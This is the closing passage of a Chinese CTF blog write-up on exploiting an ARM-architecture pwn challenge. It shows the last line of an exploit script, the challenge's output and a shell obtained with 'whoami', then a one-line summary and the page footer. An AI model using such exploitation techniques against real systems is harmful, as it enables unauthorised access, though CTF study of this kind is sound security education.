+</span></span><span class=line><span class=cl>  p.send<span class=o>(</span><span class=s2>&#34;\n&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
+</span></span><span class=line><span class=cl>Let<span class=err>&#39;</span>s Do Some Typing Exercise~
+</span></span><span class=line><span class=cl>Press Enter to get start<span class=p>;</span>
+</span></span><span class=line><span class=cl>Input ~ <span class=k>if</span> you want to quit
+</span></span><span class=line><span class=cl><span class=se>\x</span>00------Begin------
+</span></span><span class=line><span class=cl>rob
+</span></span><span class=line><span class=cl>$ whoami
+</span></span><span class=line><span class=cl>lhon901</span></span></code></pre></td></tr></table></div></div><h2 id=总结>总结
+<a class=header-anchor href=#%e6%80%bb%e7%bb%93></a></h2><p>本题难点主要在如何找到 <code>system</code> 函数，逆向难度大</p></div><footer class=post-footer><div class=post-tags><a href=/tags/ctf/>Ctf
+</a><a href=/tags/pwn/>Pwn</a></div><div class=post-share-tools><div class=post-share-loading><i class="fa-solid fa-ellipsis fa-spin"></i></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class=a2a_dd href=https://www.addtoany.com/share></a><a class=a2a_button_wechat></a><a class=a2a_button_qzone></a><a class=a2a_button_sina_weibo></a><a class=a2a_button_douban></a><a class=a2a_button_facebook></a><a class=a2a_button_x></a><a class=a2a_button_email></a><a class=a2a_button_printfriendly></a></div></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
+赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - 支付宝">
+<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - 微信">
+<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+从零开始的 Pwn 之旅 异架构 Arm</li><li class=post-copyright-author><strong>本文作者： </strong>lhon901</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/ title="从零开始的 Pwn 之旅   异架构 Arm">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
+</a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
+</span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i>
+</span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"></div><div class="post-nav-prev post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---orw/ rel=prev title="从零开始的 Pwn 之旅 - ORW">从零开始的 Pwn 之旅 - ORW
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div id=i18n-translate class=i18n-translate><i class="fa fa-language"></i><div id=lang-select class=lang-select><div id=lang-selected class=selected-option><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=selected-language>简体中文</span>
+<i class="fa fa-chevron-down"></i></div><div id=lang-options class=lang-options><div class=lang-option lang-code=zh-cn lang-name=简体中文 lang-url=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/><span class="flag-icon flag-icon-zh-cn"></span>
+<span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
+<span itemprop=copyrightYear>2025
+</span><span class=with-love><i class="fa fa-heart"></i>
+</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/","title":"从零开始的 Pwn 之旅   异架构 Arm","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1752933845" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1752933845" defer></script></body></html>
